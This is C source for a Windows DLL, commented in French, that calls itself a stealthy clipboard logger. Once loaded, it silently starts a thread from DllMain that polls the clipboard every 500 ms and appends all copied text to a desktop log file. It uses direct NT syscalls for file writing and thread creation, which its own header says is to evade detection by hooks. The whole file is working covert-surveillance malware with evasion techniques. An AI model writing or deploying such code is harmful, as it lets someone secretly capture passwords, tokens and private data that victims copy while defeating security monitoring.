/**
 * @file clipboard-logger-stealth.c
 * @brief Version furtive de la DLL de surveillance du presse-papiers.
 * 
 * Cette version utilise des appels système directs pour éviter la détection
 * par les hooks de la libc et ne contient pas d'horodatage dans les logs.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <windows.h>
#include <winternl.h>
#include <direct-syscalls.h>
#include <peb-lookup.h>

// Intervalle de scrutation en millisecondes
#define POLLING_INTERVAL 500
#define LOG_FILE_NAME_SUFFIX L"\\Desktop\\clipboard_log.txt"
#define NT_PATH_PREFIX L"\\??\\C:\\Users\\"

// Variables globales
HINSTANCE g_hInstance = NULL;
HANDLE g_hThread = NULL;
BOOL g_bRunning = TRUE;

// Définition de fonctions utilitaires locales pour éviter la dépendance à la libc
size_t _wcslen(const wchar_t *s) {
    const wchar_t *p = s;
    while (*p) ++p;
    return p - s;
}

size_t _strlen(const char *s) {
    const char *p = s;
    while (*p) ++p;
    return p - s;
}

/**
 * @brief Copie une chaîne de caractères large.
 */
void _wcscpy(wchar_t* dest, const wchar_t* src) {
    while ((*dest++ = *src++));
}

/**
 * @brief Concatène deux chaînes de caractères larges.
 */
void _wcscat(wchar_t* dest, const wchar_t* src) {
    while (*dest) dest++;
    while ((*dest++ = *src++));
}

/**
 * @brief Récupère le chemin du fichier de log sur le bureau de l'utilisateur actuel.
 */
BOOL GetLogFilePath(wchar_t* buffer, size_t maxCount) {
    char username[256];
    DWORD usernameLen = sizeof(username);
    
    // Utilisation de GetUserNameA (nécessite advapi32.lib)
    if (GetUserNameA(username, &usernameLen)) {
        wchar_t wUsername[256];
        // Conversion simple ASCII vers WCHAR
        for (DWORD i = 0; i < usernameLen; i++) {
            wUsername[i] = (wchar_t)username[i];
        }
        wUsername[usernameLen] = L'\0';

        // Construction du chemin NT : \??\C:\Users\<USER>\Desktop\clipboard_log.txt
        _wcscpy(buffer, NT_PATH_PREFIX);
        _wcscat(buffer, wUsername);
        _wcscat(buffer, LOG_FILE_NAME_SUFFIX);
        return TRUE;
    }
    return FALSE;
}

/**
 * @brief Logue le texte dans le fichier en utilisant des appels système directs.
 */
void LogClipboardText(const char* text) {
    if (!text || text[0] == '\0') return;

    wchar_t logPath[MAX_PATH];
    if (!GetLogFilePath(logPath, MAX_PATH)) return;

    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uniName;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;

    // Initialisation du nom du fichier (format NT)
    uniName.Buffer = logPath;
    uniName.Length = (USHORT)(_wcslen(logPath) * sizeof(WCHAR));
    uniName.MaximumLength = (USHORT)(MAX_PATH * sizeof(WCHAR));

    InitializeObjectAttributes(&objAttr, &uniName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Création ou ouverture du fichier via dCreateFile (NtCreateFile)
    status = dCreateFile(
        &hFile,
        FILE_APPEND_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (status == 0) { // STATUS_SUCCESS
        SIZE_T len = _strlen(text);
        const char* separator = "\r\n-----------------------------------\r\n";
        SIZE_T sepLen = _strlen(separator);

        // Écriture du texte via dWriteFile (NtWriteFile)
        dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)text, (ULONG)len, NULL, NULL);
        // Écriture du séparateur
        dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)separator, (ULONG)sepLen, NULL, NULL);

        CloseHandle(hFile);
    }
}

/**
 * @brief Fonction principale du thread de scrutation.
 */
DWORD WINAPI PollingThread(LPVOID lpParam) {
    DWORD dwLastSequence = 0;
    
    dwLastSequence = GetClipboardSequenceNumber();

    while (g_bRunning) {
        DWORD dwCurrentSequence = GetClipboardSequenceNumber();

        if (dwCurrentSequence != dwLastSequence) {
            dwLastSequence = dwCurrentSequence;

            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* pszText = (char*)GlobalLock(hData);
                    if (pszText) {
                        LogClipboardText(pszText);
                        GlobalUnlock(hData);
                    }
                }
                CloseClipboard();
            }
        }
        Sleep(POLLING_INTERVAL);
    }

    return 0;
}

/**
 * @brief Point d'entrée de la DLL.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    g_hInstance = hinstDLL;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            g_bRunning = TRUE;
            
            // Utilisation de dCreateThreadEx (NtCreateThreadEx)
            dCreateThreadEx(
                &g_hThread, 
                THREAD_ALL_ACCESS, 
                NULL,
                GetCurrentProcess(), 
                PollingThread,
                NULL,
                0, 0, 0, 0, 
                NULL
            );
            break;

        case DLL_PROCESS_DETACH:
            g_bRunning = FALSE;
            if (g_hThread) {
                WaitForSingleObject(g_hThread, 1000);
                CloseHandle(g_hThread);
            }
            break;
    }
    return TRUE;
}
